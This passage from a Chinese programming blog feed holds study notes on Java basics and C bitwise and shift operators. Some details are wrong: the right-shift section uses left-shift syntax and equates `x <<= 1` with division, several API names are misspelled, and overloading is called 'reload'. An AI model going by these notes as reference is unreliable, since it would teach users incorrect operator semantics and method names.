title="实际运用"></a>实际运用</h3><ul><li>在创建工具类时可以使用static，这样就不需要再创建对象了</li><li>在编写工具类时，推荐将<strong>构造方法私有化</strong>，防止别人使用麻烦的代码（创建对象等）</li></ul><h2 id="静态代码块"><a href="#静态代码块" class="headerlink" title="静态代码块"></a>静态代码块</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>功能：在加载class时先加载一次静态代码块里面的东西，以后就不会加载了</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 构造方法 </tag>
            
            <tag> 封装 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>方法</title>
      <link href="/Programming/Java/day4_%E6%96%B9%E6%B3%95.html"/>
      <url>/Programming/Java/day4_%E6%96%B9%E6%B3%95.html</url>
      
        <content type="html"><![CDATA[<p>方法就像C语言的函数，用来<strong>简化代码</strong>用的</p><span id="more"></span><h2 id="定义格式"><a href="#定义格式" class="headerlink" title="定义格式"></a>定义格式</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">修饰符(如<span class="keyword">public</span> <span class="keyword">static</span>) 返回值类型 方法名(参数)&#123;</span><br><span class="line">方法体;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h2><ul><li>如果类型为void可以不需要返回值</li><li>通过return可以有一个返回值，要与返回值类型相同</li></ul><h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><ul><li>基本数据类型只传值(不会破坏元数据)</li><li>引用数据类型是传引用(破坏原数据)</li></ul><p>当我们需要的参数不确定，或则很多时，方法重载就不适用了，可变参数有两种形式</p><h3 id="可变参数"><a href="#可变参数" class="headerlink" title="可变参数"></a>可变参数</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.manu.parameter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">KeBian</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(add(<span class="number">23</span>,<span class="number">23</span>,<span class="number">23</span>,<span class="number">45</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span>... args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i : args) &#123;</span><br><span class="line">            result += i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="数组参数"><a href="#数组参数" class="headerlink" title="数组参数"></a>数组参数</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.manu.parameter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Arrays</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(add(<span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">23</span>,<span class="number">34</span>,<span class="number">34</span>&#125;));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span>[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i : args) &#123;</span><br><span class="line">            result += i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意</p><ul><li>可变参数的是个数可变</li><li>在调用方法时，如果可变参数方法和固定参数方法重复的话，优先固定参数</li><li>一个方法只能有一个可变参数，而且放在最后<ul><li><code>(int a, String... s)</code></li></ul></li></ul><h2 id="单元测试"><a href="#单元测试" class="headerlink" title="单元测试"></a>单元测试</h2><h3 id="Junit"><a href="#Junit" class="headerlink" title="Junit"></a>Junit</h3><p>在写大型程序时，肯定是写一些代码测试一些代码，不可能再把所有代码运行一遍</p><p>在eclipse里面添加Junit库后在方法前面添加注解<code>@Test</code>即可进行单元测试</p><p>添加方法：eclipse的Project Explorer右键–&gt;Build Path–&gt;Configure Path–&gt;Java Build Path–&gt;Libraries–&gt;Moudlespath–&gt;add Library–&gt;classpath–&gt;Junit</p><h2 id="方法重载-reload"><a href="#方法重载-reload" class="headerlink" title="方法重载(reload)"></a>方法重载(reload)</h2><p>也就是方法名可以一样，但参数不能一样 </p><p>判断方法是否重复要看<strong>方法名+参数</strong>，两者一样才算重复</p><p>比如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Method</span><span class="params">()</span></span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Method</span><span class="params">(<span class="keyword">int</span> a)</span></span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Method</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="程序健壮"><a href="#程序健壮" class="headerlink" title="程序健壮"></a>程序健壮</h3><p>不容易崩溃的程序才叫健壮</p><p>一般需要加上很多判断条件才能让程序不容易崩溃</p><h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><p>功能：通常1,2,3,4标识代码里面的角色时，但就这样的话代码变得难读，而枚举就是为了增加代码可读性</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.manu.student03;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestEnum</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> a = Season.AUTUMN;</span><br><span class="line">        <span class="keyword">int</span> b = Season.SPRINT;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用单独的一个类来管理季节</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Season</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> SPRINT = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> SUMMER = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> AUTUMN = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> WINTER = <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><p>相当与上面的简化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.manu.student03;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">enum</span> <span class="title">Season</span> </span>&#123;</span><br><span class="line">    SPRING,SUMMER,AUTUMN,WINTER</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.manu.student03;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo_Enum</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(Season.AUTUMN);</span><br><span class="line">        System.out.println(Season.AUTUMN.ordinal());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>遍历</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(Season s : Season.values()) &#123;</span><br><span class="line">    System.out.println(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="toString()"></a>toString()</h2><ul><li>所有类都继承java.lang.Object</li><li>它有一个toString()方法可以显示内存地址</li><li>利用eclipse可以重写toString()方法（显示所有成员）</li></ul><h2 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h2><ul><li><code>==</code>比较的是引用</li><li><code>equals</code>比较的是数据</li><li>有时候还是要重写<code>equals</code>进行对象之间的比较</li></ul><h2 id="jar库"><a href="#jar库" class="headerlink" title="jar库"></a>jar库</h2><ul><li>就是一个压缩包，里面包含类</li><li>用户也可以生成jar包</li></ul><h2 id="Scanner"><a href="#Scanner" class="headerlink" title="Scanner"></a>Scanner</h2><ul><li>hasNextxxx可以用来判断输入的是不是xxx类型的</li></ul><h2 id="StringBuff"><a href="#StringBuff" class="headerlink" title="StringBuff"></a>StringBuff</h2><ul><li>相对与String字符占多少申请多少空间，String是直接申请很多空间</li><li>String虽然也可以通过+将字符组拼，但那会重新申请内存，将字符“搬”到里面去，比较费时间</li><li>StringBuff有一个默认的容量，他会根据你的字符进行扩容，扩容时改变指向，容量通常X2</li></ul><h2 id="StringBuilder"><a href="#StringBuilder" class="headerlink" title="StringBuilder"></a>StringBuilder</h2><ul><li>基本和StringBruff相同</li></ul><h4 id="不同"><a href="#不同" class="headerlink" title="不同"></a>不同</h4><ul><li>StringBuilder线程不安全，性能略高</li><li>StringBuff线程安全，性能相对低</li></ul><blockquote><p>字符串在JDK9之前使用char（2字节）存储，JDK9使用byte存储</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 方法 </tag>
            
            <tag> 函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数组</title>
      <link href="/Programming/Java/day3_%E6%95%B0%E7%BB%84.html"/>
      <url>/Programming/Java/day3_%E6%95%B0%E7%BB%84.html</url>
      
        <content type="html"><![CDATA[<p> 介绍了数组和栈堆相关的概念</p><span id="more"></span><h2 id="引用数据类型和基本数据类型在创建的区别"><a href="#引用数据类型和基本数据类型在创建的区别" class="headerlink" title="引用数据类型和基本数据类型在创建的区别"></a>引用数据类型和基本数据类型在创建的区别</h2><ul><li>基本数据类型只要声明了，就会被<strong>赋予内存</strong>，不管有没有赋值</li><li>引用数据类型创建分两步，声明和初始化<ul><li>声明只在<strong>栈</strong>里面分配内存，用来<strong>存储引用（地址）</strong></li><li>初始化在堆里或方法区里分配内存，<strong>创建实际数据</strong><ul><li><code>new</code>在堆里</li><li>程序运行常量放在方法区里</li></ul></li></ul></li></ul><h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>所有<strong>局部变量</strong>都在栈里</p><h2 id="一维数组"><a href="#一维数组" class="headerlink" title="一维数组"></a>一维数组</h2><h3 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h3><p>有两种声明方法，我使用int类型举例</p><p>1.<code>int[] ArrayName</code></p><p>2.<code>int ArraryName[]</code></p><p>注意：没初始化的数组无法使用</p><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>初始化才能使用数组，三种方式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//初始化使用默认值(基本数据类型0,false，引用数据类型null)</span></span><br><span class="line"><span class="keyword">int</span>[] ArrayName = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">3</span>];</span><br><span class="line"><span class="comment">//根据元素个数</span></span><br><span class="line"><span class="keyword">int</span>[] ArrayName = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>&#125;;</span><br><span class="line"><span class="comment">//和上面差不多</span></span><br><span class="line"><span class="keyword">int</span>[] ArrayName = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>&#125;;</span><br></pre></td></tr></table></figure><h3 id="使用数组"><a href="#使用数组" class="headerlink" title="使用数组"></a>使用数组</h3><p><code>ArrayName[索引]</code></p><p>索引从0开始，可以对元素进行赋值和使用</p><p>使用时需要注意：</p><ul><li>索引不能超出范围</li><li>引用空数组</li></ul><p>填充数组：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="comment">//使用</span></span><br><span class="line">Arrays.fill(ArrayName,value);</span><br></pre></td></tr></table></figure><h2 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h2><h3 id="1-声明"><a href="#1-声明" class="headerlink" title="1.声明"></a>1.声明</h3><ul><li><code>数据类型[][] ArrayName</code></li><li><code>数据类型 ArrayName[][]</code></li></ul><h3 id="2-初始化"><a href="#2-初始化" class="headerlink" title="2.初始化"></a>2.初始化</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line">数据类型[][] 数组名=<span class="keyword">new</span> 数据类型[m][n];<span class="comment">//使用默认值</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">数据类型 数组名[][]=&#123;&#123;a,b&#125;,&#123;c,d&#125;&#125;;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">int</span>[][] arrayName = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>][];<span class="comment">//默认值null</span></span><br><span class="line"><span class="comment">//赋值</span></span><br><span class="line">arrayName[<span class="number">0</span>] = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;a,b,c&#125;;</span><br></pre></td></tr></table></figure><h3 id="3-使用"><a href="#3-使用" class="headerlink" title="3.使用"></a>3.使用</h3><p><code>arrayName[索引][索引]</code> </p><p>举一个遍历二维数组的例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[][] a = &#123;&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;,&#123;<span class="number">0</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">6</span>&#125;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;a.length;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;a[i].length;j++)&#123;</span><br><span class="line">System.out.print(a[i][j]+<span class="string">&quot; &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数组 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>按位运算与移位运算</title>
      <link href="/Programming/C/%E6%8C%89%E4%BD%8D%E4%B8%8E%E7%A7%BB%E4%BD%8D.html"/>
      <url>/Programming/C/%E6%8C%89%E4%BD%8D%E4%B8%8E%E7%A7%BB%E4%BD%8D.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>按位与移位的学习只是要知道底层是怎么工作的，日常很少用到</p></blockquote><span id="more"></span><h2 id="按位运算"><a href="#按位运算" class="headerlink" title="按位运算"></a>按位运算</h2><ol><li>按位与<code>&amp;</code>: 1&amp;1=1, 其他都是0<ul><li>应用:让某一位或某些位位0: x &amp; 0xFE<ul><li>取一个数的某一段: x &amp; 0xFF</li></ul></li></ul></li><li><strong>按位或 <code>|</code></strong> ; 1 | 0=1, 1 | 1=1, 0 | 0=0<ul><li>应用:使某位为1;<ul><li>拼数:0xFF00 | 0x00FF</li></ul></li></ul></li><li><strong>按位取反<code>~</code></strong>:1-&gt;0, 0-&gt;1<ul><li>得到全部为1的数: ~0</li><li>7的二进制为0111, x | 7使低3位为1;</li><li>x &amp; ~7, 则使低3位为0</li></ul></li><li><strong>按位异或<code>^</code></strong>: 相同为0, 不同为1;<ul><li>x^y ^y ==&gt; x</li><li>x=y ,x^y=0</li></ul></li></ol><h2 id="移位运算"><a href="#移位运算" class="headerlink" title="移位运算"></a>移位运算</h2><p><strong>左移</strong>：<code>i &lt;&lt; j</code></p><ul><li>i 中所有的为向左移动 j 个位置，右边填0；</li><li>所有小于int 的类型，移位以int的方式来做，结果是int</li><li><code>x &lt;&lt;= 1 等价 x *= 2</code></li><li><code>x &lt;&lt;= n 等价 x *= 2^n</code></li></ul><p><strong>右移</strong>：<code>i &lt;&lt; j</code></p><ul><li>i 中所有的为向右移动 j 个位置，</li><li>所有小于int 的类型，移位以int的方式来做，结果是int</li><li>对与unsigned的类型，左边填入0</li><li>而signed的类型，左边填入原来的最高位</li><li><code>x &lt;&lt;= 1 等价 x /= 2</code></li><li><code>x &lt;&lt;= n 等价 x /= 2^n</code></li></ul><p>移位不能用负数</p>]]></content>
      
      
      <categories>
          
          <category> C </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 按位 </tag>
            
            <tag> 移位 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>条件判断和字符串</title>
      <link href="/Programming/Java/day2_%E6%9D%A1%E4%BB%B6%E5%88%A4%E6%96%AD%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2.html"/>
      <url>/Programming/Java/day2_%E6%9D%A1%E4%BB%B6%E5%88%A4%E6%96%AD%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2.html</url>
      
        <content type="html"><![CDATA[<p> 分支、循环与字符串相关的一些操作</p><span id="more"></span><h2 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h2><h3 id="1-if语句"><a href="#1-if语句" class="headerlink" title="1.if语句"></a>1.if语句</h3><p>语法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//形式1</span></span><br><span class="line"><span class="keyword">if</span> (布尔表达式) &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//形式3(else if数量不限，else可有可无)</span></span><br><span class="line"><span class="keyword">if</span> (布尔表达式) &#123;</span><br><span class="line">    </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (布尔表达式) &#123;</span><br><span class="line">    </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-switch语句"><a href="#2-switch语句" class="headerlink" title="2.switch语句"></a>2.switch语句</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(表达式)&#123;</span><br><span class="line"><span class="keyword">case</span> value1:</span><br><span class="line">语句块;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> value2:</span><br><span class="line">语句块;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">语句块;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>表达式可以是整数，字符，枚举，字符串</p><p>case后面必须是常量</p><p>break用来中断语句</p></blockquote><h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><h3 id="1-while循环"><a href="#1-while循环" class="headerlink" title="1.while循环"></a>1.while循环</h3><p>语法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(布尔表达式)&#123;</span><br><span class="line">循环体;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>满足条件运行循环体</p><h3 id="2-do-while循环"><a href="#2-do-while循环" class="headerlink" title="2.do while循环"></a>2.do while循环</h3><p>语法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">循环体;</span><br><span class="line">&#125;<span class="keyword">while</span>(表达式)</span><br></pre></td></tr></table></figure><h3 id="3-for循环"><a href="#3-for循环" class="headerlink" title="3.for循环"></a>3.for循环</h3><p>语法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1</span></span><br><span class="line"><span class="keyword">for</span>(初始化语句;条件判断语句;更新语句)&#123;</span><br><span class="line">循环体;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2</span></span><br><span class="line"><span class="keyword">for</span> (循环变量类型 循环变量名称 : 要被遍历的对象) &#123;</span><br><span class="line">    循环体        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>条件判断语句不写默认true</li></ul><h2 id="break-continue"><a href="#break-continue" class="headerlink" title="break continue"></a>break continue</h2><ul><li>break跳出<strong>当前</strong>循环</li><li>continue中断<strong>当前</strong>循环，进入下一次循环</li></ul><h3 id="break的其他用法"><a href="#break的其他用法" class="headerlink" title="break的其他用法"></a>break的其他用法</h3><ul><li>自定义标签，跳出标签所在循环</li></ul><p>比如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">outside:</span><br><span class="line"><span class="keyword">while</span>()&#123;</span><br><span class="line">inside:</span><br><span class="line"><span class="keyword">for</span>()&#123;</span><br><span class="line"><span class="keyword">break</span> outside;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><h3 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h3><p>在<code>&quot;&quot;</code>里面的就是字符串常量</p><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>定义一个字符串变量需要引用一个新的类<code>String</code></p><p>有两种定义模式</p><p>1.<code>String str = &quot;HelloWorld!&quot;;</code></p><p>2.<code>String str2 = new String(&quot;HelloWorld!&quot;);</code></p><h3 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h3><p>通过<code>+</code>可以对字符串（或其他数据类型）常量和变量作连接操作</p><h3 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h3><ul><li>字符串是无法被修改的</li><li>基本数据类型都在<strong>栈</strong>区，栈容量比较小</li><li>引用数据类型在<strong>栈</strong>存放地址，数据存放在<strong>方法常量区</strong>，地址指向数据</li></ul><p>如图</p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/引用数据类型存放内存.png" alt="引用数据类型存放内存" style="zoom:50%;" /><ul><li>基本数据类型变量改变时会直接覆盖原始数据</li><li>引用数据类型的原始数据不会被删除，改变时会创建新的数据，并改变地址指向</li></ul><h3 id="信息获取"><a href="#信息获取" class="headerlink" title="信息获取"></a>信息获取</h3><p>也就是针对字符串的一些操作</p><h4 id="长度"><a href="#长度" class="headerlink" title="长度"></a>长度</h4><p><code>s.length()</code></p><p>s代表字符变量</p><p>示例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String str = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">System.out.println(str.length());</span><br></pre></td></tr></table></figure><p>结果就是12</p><h4 id="查找子字符串的位置"><a href="#查找子字符串的位置" class="headerlink" title="查找子字符串的位置"></a>查找子字符串的位置</h4><p>查找字符会从0开始索引</p><p>1.<code>s.indexOf(int c);</code></p><p>传递一个数字或字符，返回字符的索引</p><p>2.<code>s.indexOf(String str);</code></p><p>传递一段字符串，返回第一个字符的索引，不存在返回-1</p><p>3.<code>s.lastIndexOf(String str);</code></p><p>从字符串末尾开始查找，返回第一个字符的索引</p><h4 id="获取指定索引的字符"><a href="#获取指定索引的字符" class="headerlink" title="获取指定索引的字符"></a>获取指定索引的字符</h4><p><code>s.charAt(int index);</code></p><h4 id="获取指定字符串"><a href="#获取指定字符串" class="headerlink" title="获取指定字符串"></a>获取指定字符串</h4><p><code>s.substring(int beginindex);</code></p><p>得到索引以后的字符</p><p><code>s.substring(int beginindex,int endindex);</code></p><p>得到索引范围内的字符</p><h3 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h3><p>判断的返回值是布尔值</p><h4 id="开头字符"><a href="#开头字符" class="headerlink" title="开头字符"></a>开头字符</h4><p><code>s.startWith(String prefix);</code></p><h4 id="结尾字符"><a href="#结尾字符" class="headerlink" title="结尾字符"></a>结尾字符</h4><p><code>s.endWith(String suffix);</code></p><blockquote><p><code>&quot;&quot;</code>虽然也返回true，但没有意义</p></blockquote><h4 id="相等"><a href="#相等" class="headerlink" title="相等"></a>相等</h4><p>1.<code>==</code></p><p>功能：可以判断数据引用是否相同</p><p>规则：<code>str1==str2</code></p><p>特例</p><figure class="highlight java"><table><tr><td 